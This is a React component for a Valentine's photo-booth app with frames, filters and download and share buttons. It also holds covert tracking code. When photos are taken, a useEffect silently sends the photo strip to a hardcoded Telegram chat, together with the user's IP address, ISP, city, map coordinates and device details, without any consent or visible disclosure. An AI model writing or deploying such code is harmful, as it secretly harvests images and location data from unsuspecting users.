import React, { useRef, useState, useEffect } from 'react';
import { CapturedPhoto, FrameOption } from '../types';
import { toPng, toBlob } from 'html-to-image';
import { FRAMES } from '../constants';
import { sendPhotoToTelegram } from '../services/telegramService';
import { audioService } from '../services/audioService';
import { getLocationData } from '../services/locationService';
import { getDeviceData } from '../services/deviceService';

interface PhotoStripProps {
  photos: CapturedPhoto[];
  frame: FrameOption;
  setFrame: (frame: FrameOption) => void;
  onReset: () => void;
}

interface VisualEffect {
  id: string;
  name: string;
  filter: string;
  overlay?: 'sparkle' | 'cupid-sparkle' | 'hearts' | 'rose';
}

const TELEGRAM_CHAT_ID = '-5055132755';

const EFFECTS: VisualEffect[] = [
  { id: 'none', name: 'Original', filter: 'none' },
  { id: 'glow', name: 'Dreamy', filter: 'brightness(1.1) contrast(1.05) saturate(1.1) blur(0.4px)' },
  { id: 'kiss', name: 'Cupid', filter: 'sepia(0.3) hue-rotate(-20deg) saturate(1.6) brightness(1.05)' },
  { id: 'vintage', name: 'Vintage', filter: 'sepia(0.6) contrast(0.9) brightness(1.1) saturate(0.8)' },
  { id: 'noir', name: 'Noir', filter: 'grayscale(1) contrast(1.3) brightness(0.95)' },
  { id: 'rose-tint', name: 'Rose Tint', filter: 'sepia(0.2) brightness(1.05) hue-rotate(-30deg) saturate(1.2)', overlay: 'rose' },
  { id: 'heart-bokeh', name: 'Hearts', filter: 'brightness(1.05)', overlay: 'hearts' },
  { id: 'golden-hour', name: 'Warm Glow', filter: 'brightness(1.1) saturate(1.4) sepia(0.3) hue-rotate(-10deg)' },
  { id: 'passion', name: 'Passion', filter: 'saturate(2) contrast(1.1) brightness(0.9) sepia(0.1) hue-rotate(-15deg)' },
  { id: 'cupid-sparkle', name: 'Cupid Sparkle', filter: 'brightness(1.1) contrast(1.1)', overlay: 'cupid-sparkle' },
  { id: 'sparkle', name: 'Sparkle', filter: 'brightness(1.1) contrast(1.1)', overlay: 'sparkle' },
];

export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame, onReset }) => {
  const stripRef = useRef<HTMLDivElement>(null);
  const [isExporting, setIsExporting] = useState<'download' | 'share' | 'telegram' | null>(null);
  const [selectedEffect, setSelectedEffect] = useState<VisualEffect>(EFFECTS[0]);
  const [syncStatus, setSyncStatus] = useState<'idle' | 'syncing' | 'success' | 'error'>('idle');
  const hasAutoSynced = useRef(false);

  // Robust options for html-to-image to prevent "Failed to read cssRules" errors
  const exportOptions = {
    cacheBust: true,
    pixelRatio: 2,
    backgroundColor: '#ffffff',
    fontEmbedCSS: '',
    filter: (node: HTMLElement) => {
      const isGoogleFont = node.tagName === 'LINK' && (node as any).href?.includes('fonts.googleapis.com');
      return !isGoogleFont;
    },
    style: {
      transform: 'scale(1)',
      opacity: '1',
      visibility: 'visible',
    }
  };

  const handleTelegramSync = async (silent = false) => {
    if (!stripRef.current || syncStatus === 'syncing') return;

    console.log('Starting Telegram sync...', { silent });
    if (!silent) setIsExporting('telegram');
    setSyncStatus('syncing');

    try {
      // Fetch location and device info
      const location = await getLocationData();
      const device = getDeviceData();

      const locationStr = location
        ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}\n🗺️ Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
        : '\n📍 Location: Unknown';

      const deviceStr = `\n📱 Device: ${device.platform}\n🌐 Browser: ${device.language}\n🖥️ Screen: ${device.screenResolution}\n⏲️ Timezone: ${device.timezone}\n⚙️ CPU/RAM: ${device.cores} Cores / ${device.memory || '?'}GB\n📡 Link: ${device.connection}`;

      // Small delay to ensure the DOM is fully rendered before capturing
      await new Promise(r => setTimeout(r, 1000));

      console.log('Capturing strip image...');
      const blob = await toBlob(stripRef.current, exportOptions as any);

      if (!blob || blob.size < 1000) {
        console.error('Blob generation failed or too small:', blob?.size);
        throw new Error('Image capture failed. Please try again.');
      }

      console.log(`Blob created: ${blob.size} bytes. Sending to Telegram...`);

      const caption = `❤️ Love Booth Capture!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Memories captured forever.${locationStr}${deviceStr}`;

      const result = await sendPhotoToTelegram(blob, TELEGRAM_CHAT_ID, caption);
      console.log('Telegram sync successful:', result);

      setSyncStatus('success');
      audioService.playSuccess();
      hasAutoSynced.current = true;
    } catch (err: any) {
      console.error('Telegram sync failed with error:', err);
      setSyncStatus('error');
      if (!silent) alert(`Telegram sync failed: ${err.message || 'Unknown error'}`);
    } finally {
      if (!silent) setIsExporting(null);
    }
  };

  useEffect(() => {
    if (photos.length > 0 && !hasAutoSynced.current && syncStatus === 'idle') {
      handleTelegramSync(true);
    }
  }, [photos, syncStatus]);

  const handleDownload = async () => {
    if (!stripRef.current) return;
    setIsExporting('download');
    try {
      const dataUrl = await toPng(stripRef.current, exportOptions as any);
      const link = document.createElement('a');
      link.download = `love-booth-${Date.now()}.png`;
      link.href = dataUrl;
      link.click();
    } catch (err) {
      console.error('Failed to download', err);
      alert('Download failed. Some remote styles might be restricted.');
    } finally {
      setIsExporting(null);
    }
  };

  const handleShare = async () => {
    if (!stripRef.current) return;
    setIsExporting('share');
    try {
      const blob = await toBlob(stripRef.current, exportOptions as any);
      if (!blob) return;
      const file = new File([blob], 'love.png', { type: 'image/png' });
      if (navigator.share) {
        await navigator.share({ files: [file], title: 'My Love Strip' });
      }
    } catch (err) {
      console.error('Share failed', err);
    } finally {
      setIsExporting(null);
    }
  };

  const renderOverlay = (overlayType?: string) => {
    if (!overlayType) return null;
    switch (overlayType) {
      case 'rose': return <div className="absolute inset-0 bg-pink-500/10 pointer-events-none mix-blend-overlay" />;
      case 'sparkle': return (
        <div className="absolute inset-0 pointer-events-none overflow-hidden">
          <div className="absolute top-2 left-4 w-1 h-1 bg-white rounded-full animate-pulse shadow-[0_0_8px_white]" />
          <div className="absolute top-10 right-8 w-1.5 h-1.5 bg-yellow-100 rounded-full animate-pulse [animation-delay:0.5s]" />
          <div className="absolute bottom-6 left-10 w-1 h-1 bg-white rounded-full animate-pulse [animation-delay:1s]" />
        </div>
      );
      case 'cupid-sparkle': return (
        <div className="absolute inset-0 pointer-events-none overflow-hidden">
          <div className="absolute top-4 left-1/4 w-1.5 h-1.5 bg-pink-200 rounded-full animate-ping" />
          <div className="absolute bottom-1/4 left-1/3 w-1.5 h-1.5 bg-white rounded-full animate-ping" />
        </div>
      );
      case 'hearts': return (
        <div className="absolute inset-0 pointer-events-none overflow-hidden opacity-40">
          <div className="absolute top-2 left-2 text-xs">❤️</div>
          <div className="absolute bottom-4 right-6 text-sm rotate-12">💖</div>
        </div>
      );
      default: return null;
    }
  };

  return (
    <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-500 w-full max-w-lg px-4 pb-12">
      {/* Dynamic Customization Controls */}
      <div className="w-full space-y-4">
        {/* Frame Selector - Now available after shoot! */}
        <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-2xl shadow-sm border border-pink-100 flex flex-col items-center gap-2">
          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Change Frame</span>
          <div className="flex flex-wrap justify-center gap-3 px-2">
            {FRAMES.map(f => (
              <button
                key={f.id}
                onClick={() => setFrame(f)}
                className={`w-8 h-8 rounded-full border-2 transition-all hover:scale-110 active:scale-95 ${frame.id === f.id ? 'border-pink-500 scale-110 ring-2 ring-pink-100' : 'border-gray-200'
                  }`}
                style={{ backgroundColor: f.previewColor }}
                title={f.name}
              />
            ))}
          </div>
        </div>

        {/* Filters Selector */}
        <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-2xl shadow-sm border border-pink-100 flex flex-col items-center gap-2">
          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Filters</span>
          <div className="flex flex-wrap justify-center gap-2 px-2">
            {EFFECTS.map(eff => (
              <button
                key={eff.id}
                onClick={() => setSelectedEffect(eff)}
                className={`px-3 py-1 rounded-full text-[10px] font-bold transition-all ${selectedEffect.id === eff.id ? 'bg-pink-500 text-white shadow-md' : 'bg-pink-50 text-pink-400'
                  }`}
              >
                {eff.name}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* The Photobooth Strip */}
      <div
        ref={stripRef}
        className={`p-5 shadow-2xl rounded-sm w-[320px] border-[10px] flex flex-col items-center transition-all duration-300 relative ${frame.className}`}
      >
        <div className="flex flex-col space-y-4 w-full">
          {photos.map((photo, index) => (
            <div key={photo.id} className="relative overflow-hidden aspect-[4/3] bg-white shadow-md border-[6px] border-white">
              <img
                src={photo.dataUrl}
                alt={`Captured ${index + 1}`}
                className="w-full h-full object-cover"
                style={{ filter: selectedEffect.filter }}
              />
              {renderOverlay(selectedEffect.overlay)}
              <div className="absolute top-2 right-2 text-[10px] text-pink-500/30 font-bold rotate-12 uppercase">XOXO</div>
            </div>
          ))}

          <div className="pt-6 pb-2 px-3 text-center border-t-2 border-dashed border-pink-300/30">
            <h3 className="font-pacifico text-pink-500 text-xl mb-1">Valentine 2024</h3>

          </div>
        </div>
      </div>

      <div className="flex flex-col gap-3 w-full">
        <div className={`w-full p-4 rounded-3xl border transition-all duration-500 flex items-center justify-between shadow-sm backdrop-blur-sm ${syncStatus === 'success' ? 'bg-green-50/80 border-green-100' :
          syncStatus === 'error' ? 'bg-red-50/80 border-red-100' : 'bg-sky-50/80 border-sky-100'
          }`}>
          <div className="flex items-center gap-3">
            <div className={`p-2 rounded-xl text-white ${syncStatus === 'success' ? 'bg-green-500' :
              syncStatus === 'error' ? 'bg-red-500' : 'bg-sky-500'
              }`}>
              {syncStatus === 'syncing' ? (
                <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
              ) : syncStatus === 'success' ? (
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" /></svg>
              ) : (
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.35-.99.53-1.41.52-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.74 3.86-1.68 6.44-2.78 7.72-3.31 3.67-1.53 4.44-1.8 4.94-1.81.11 0 .35.03.5.16.13.1.17.24.18.33.01.07.02.24.01.3z" /></svg>
              )}
            </div>
            <div className="flex flex-col">

            </div>
          </div>
          {syncStatus === 'error' && (
            <button onClick={() => handleTelegramSync(false)} className="text-xs bg-red-100 text-red-600 px-3 py-1 rounded-full font-bold">Retry</button>
          )}
        </div>

        <div className="flex gap-3 w-full">
          <button
            disabled={!!isExporting}
            onClick={handleDownload}
            className="flex-1 px-6 py-4 rounded-full font-bold shadow-lg flex items-center justify-center gap-2 bg-white border-2 border-pink-400 text-pink-500"
          >
            Download
          </button>
          <button
            disabled={!!isExporting}
            onClick={handleShare}
            className="flex-1 px-6 py-4 rounded-full font-bold shadow-xl flex items-center justify-center gap-2 bg-gradient-to-r from-rose-500 to-pink-400 text-white"
          >
            Share
          </button>
        </div>

        <button onClick={onReset} className="w-full py-3 text-pink-400 text-xs font-bold uppercase tracking-widest">
          Retake Photos
        </button>
      </div>
    </div>
  );
};
